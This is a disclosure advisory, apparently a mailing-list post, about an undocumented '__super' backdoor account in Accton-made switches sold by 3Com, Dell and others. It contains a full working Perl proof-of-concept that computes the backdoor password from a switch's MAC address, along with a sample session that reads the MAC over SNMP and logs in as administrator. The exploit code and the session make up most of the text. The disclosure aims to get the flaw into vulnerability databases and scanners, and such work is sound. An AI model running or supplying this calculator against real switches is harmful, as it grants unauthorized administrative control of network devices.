@@ -1,0 +1,182 @@
+On the 15th of august 2009, at the HAR2009 conference, the existence of a backdoor password in Accton-based switches was revealed by Edwin Eefting, Erik Smit and Erwin Drent [1][2]. Even though this is a >365-day exploit, it does not seem to be listed in any of the vulnerability databases. Also, I could not find a patch for any of the vulnerable devices. According to the researchers, they contacted 3Com and Accton, but did not receive a response. I have a vulnerable 3Com 3812 in my lab and contacted the 3Com SRT months ago, but did not receive a response either. This seems to be a forgotten bug...
+
+The Accton company builds switches, which are rebranded and sold by several manufacturers (including 3Com, Dell, SMC, Foundry and EdgeCore). The researchers list at least the 3Com 3812, 3Com 3870 and Edgecore ES4649 as vulnerable[3], but other vendors are affected as well. For example, I could also reproduce the behavior on a Dell PowerConnect 5224 switch.
+
+The backdoor password can be calculated if you have the switch MAC-address, which can be obtained via ARP or SNMP (if you know the community string). It seems to work on all management interfaces: telnet, ssh and http. If you don't know the MAC-address but can guess the OUI, brute forcing the password is probably feasible as well. A perl script (accton.pl) to calculate the password from the MAC address is available at [4].
+
+I'm hoping as a result of this e-mail, this will end up in vulnerability databases, scanners etc. I believe more vulnerable devices will show up as people start scanning their networks.
+
+A sample SSH session with my 3Com 3812, running the latest available firmware (2.00):
+
+$ snmpget -v1 -c public 192.168.104.99 IF-MIB::ifPhysAddress.1001
+IF-MIB::ifPhysAddress.1001 = STRING: 0:d:54:9d:1b:90
+
+$ perl accton.pl 0:d:54:9d:1b:90
+!F!RELUO
+
+$ ssh __super@192.168.104.99
+__super@192.168.104.99's password: !F!RELUO
+
+Menu options: -------3Com SuperStack 3 Switch 3812 12-port---------------------
+bridge              - Administer bridge-wide parameters
+feature             - Administer system features
+gettingStarted      - Basic device configuration
+logout              - Logout of the Command Line Interface
+physicalInterface   - Administer physical interfaces
+protocol            - Administer protocols
+security            - Administer security
+system              - Administer system-level functions
+trafficManagement   - Administer traffic management
+
+Type ? for help.
+------------------------------------- (1)--------------------------------------
+Select menu option:
+
+-------------------------------------references--------------------------------
+[1] HAR2009 talk https://har2009.org/program/events/103.en.html <https://har2009.org/program/events/103.en.html> 
+[2] HAR2009 slides http://www.vettebak.nl/hak/ <http://www.vettebak.nl/hak/> 
+[3] Backdoor description http://stuff.zoiah.net/doku.php?id=accton:backdoor <http://stuff.zoiah.net/doku.php?id=accton:backdoor> 
+[4] Exploit calculator http://www.vettebak.nl/hak/accton.pl <http://www.vettebak.nl/hak/accton.pl> 
+---------------------------------------EOF-------------------------------------
+
+#!/usr/bin/perl -w
+use strict;
+
+# Accton Mercury "__super" user proof of concept
+# Disassembling and first PoC - smite@zylon.net.
+# Disassembling and math - psy@datux.nl, gido@datux.nl
+
+my $counter;
+my $char;
+
+my $mac = $ARGV[0];
+my @mac;
+
+foreach my $octet (split (":", $mac)) {
+  push @mac, hex($octet);
+}
+
+if (!defined $mac[5]) {
+    print "Usage: ./accton.pl 00:01:02:03:04:05\n";
+    exit 1;
+}
+
+sub printchar {
+	my ($char) = @_;
+
+	$char = $char % 0x4b;
+	
+	if ($char <= 9 || ($char > 0x10 && $char < 0x2a) || $char > 0x30) {
+	    print pack("c*", $char+0x30);
+	} else {
+	    print "!";
+	}
+}
+
+
+for ($counter=0;$counter<5;$counter++) {
+    $char = $mac[$counter];
+    $char = $char + $mac[$counter+1];
+    printchar($char);
+}
+
+for ($counter=0;$counter<3;$counter++) {
+    $char = $mac[$counter];
+    $char = $char + $mac[$counter+1];
+    $char = $char +  0xF;
+    printchar($char);
+}
+
+print "\n";
+
+# Vereenvoudiging van de loop:
+# Was dit:
+#     $r11 = ($char * $key) >> 0x23;
+#     $r10 = $char >> 0x1F;
+#     $r9 = $r11 - $r10;
+#     $r11 = $r9 << 2;
+#     $r11 = $r11 + $r9;
+#     $r9 = $r11 << 4;
+#     $r9 = $r9 - $r11;
+#     $char = $char - $r9;
+#     $char = $char & 0xff;
+# Alles substen en bitshifts omrekenen:
+# #   $char = $char  - ( (( ( (($char * $key) / 34359738368)  - ($char / 2147483648)) * 4 ) + ((($char * $key) / 34359738368)  - ($char / 2147483648) ) ) * 15) ;
+# Vervolgens vereenvoudigen:
+# #     $char = $char  - ( 
+# # 	( 
+# # 		( (
+# # 			(($char * $key) / 34359738368)  - ($char / 2147483648)
+# # 		) * 4 ) 
+# # 		+ 
+# # 		(
+# # 			(($char * $key) / 34359738368)  - ($char / 2147483648) 
+# # 		) 
+# # 	) * 15
+# # 	) ;
+# #     $char = $char  - ( 
+# # 	( 
+# # 		( (
+# # 			4*( ($char * $key) / 34359738368)  - 4*($char / 2147483648)
+# # 		) ) 
+# # 		+ 
+# # 		(
+# # 			(($char * $key) / 34359738368)  - ($char / 2147483648) 
+# # 		) 
+# # 	) * 15
+# # 	) ;
+# Termen die afgerond altijd 0 zijn vallen weg!
+# print "char is $char (max is 510)\n";
+# print 510 / 2147483648  ."\n";
+# print "\n";
+# Dit kun je zien als bitshifts die alle bits naar rechts shiften:
+# #     $char = $char  - ( 
+# # 	( 
+# # 		( (
+# # 			(4* ( $char * $key / 34359738368)  )  
+# # 		) ) 
+# # 		+ 
+# # 		(
+# # 			(($char * $key) / 34359738368)  - ($char / 2147483648) 
+# # 		) 
+# # 	) * 15
+# # 	) ;
+# #     $char = $char  - ( 
+# # 	( 
+# # 		( (
+# # 			(4* ( $char * $key / 34359738368)  )  
+# # 		) ) 
+# # 		+ 
+# # 		(
+# # 			(($char * $key) / 34359738368)   
+# # 		) 
+# # 	) * 15
+# # 	) ;
+# #     $char = $char  - ( 
+# # 	( 
+# # 		( (
+# # 			(5* ( $char * $key / 34359738368)  )  
+# # 		) ) 
+# # 	) * 15
+# # 	) ;
+# #     $char = $char  - (75* ( $char * $key / 34359738368)   )  ;
+# # Dit is een shift naar rechts van 35:
+# #     $char = $char  - (75* ( $char * $key >> 35)   )  ;
+# PWNED! ;)
+#
+#after printing out all the possible combinations, the only thing left was a modulo function!!!
+#double pownage!!
+# my $output;
+# for ($char=0;$char<=0x1FE;$char++) {
+# 	$output = $char - (75 * (($char * 0x1B4E81B5 ) >> 35)   )  ;
+# 	
+# 	my $cool;
+# 	$cool = $char % 75 ;
+# 
+# 	if ($cool != $output) 
+# 	{	
+# 		print "$char word $output en is cool $cool\n";
+# 	}
+# }
+
+
